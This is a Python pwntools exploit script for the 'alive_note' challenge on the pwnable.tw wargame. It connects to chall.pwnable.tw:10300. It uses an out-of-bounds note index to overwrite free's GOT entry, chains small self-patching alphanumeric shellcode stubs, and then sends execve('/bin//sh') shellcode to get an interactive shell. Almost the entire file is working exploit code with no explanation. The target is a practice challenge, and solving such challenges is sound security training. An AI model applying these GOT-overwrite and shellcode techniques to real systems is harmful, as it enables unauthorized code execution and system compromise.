#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

local = 0
debug = 0

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./alive_note')
		if debug:
			gdb.attach(s, gdbscript='''
				
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('chall.pwnable.tw', 10300)

	return s

s = conn()

elf = ELF('alive_note')

def debug():
	if local and debug:
		gdb.attach(s, gdbscript='''
			b*0x080488EA
			c
		''')

def add_comment(index, name):
	s.sendlineafter(b'Your choice :', b'1')
	s.sendlineafter(b'Index :', str(index).encode())
	s.sendlineafter(b'Name :', name)

def add(index, name):
	add_comment(index, name)
	add_comment(9, b'a' * 8)
	add_comment(9, b'a' * 8)
	add_comment(9, b'a' * 8)

add((elf.got['free'] - elf.symbols['note']) // 4, asm('\n'.join([
    'push eax',
	'pop ecx',
	'push 0x32',
	'pop eax',
	'dec edx',
])) + b'\x75\x38')

add(0, asm('\n'.join([
	'xor al,0x31',
	'xor BYTE PTR [ecx+0x41], dl',
	'dec edx',
])) + b'\x75\x38')

add(1, asm('\n'.join([
	'dec edx',
	'dec edx',
	'dec edx',
	'dec edx',
	'dec edx',
	'inc edx'	
])) + b'\x75\x38')

add(2, asm('\n'.join([
	'xor BYTE PTR [ecx+0x42], dl',	
	'push 0x70',
	'pop edx',
])) + b'\x75\x39')

add(3, asm('\n'.join([
	'inc edx',
])) + b'\x32\x7a')

debug()

s.sendlineafter(b'Your choice :', b'3')
s.sendlineafter(b'Index :', b'2')

shellcode = asm('\n'.join([
	'xor eax, eax',
	'xor ecx, ecx',
	'xor edx, edx',
	'push edx',
	'push 0x68732f2f',
	'push 0x6e69622f',
	'push esp',
	'pop ebx',
	'mov al, 0xb',
	'int 0x80'
]))

assert(len(shellcode) + 0x43 <= 0x71)
s.sendline(b'A' * 0x43 + shellcode)

s.interactive()
#call (int)mprotect(, 0x21000, 7)
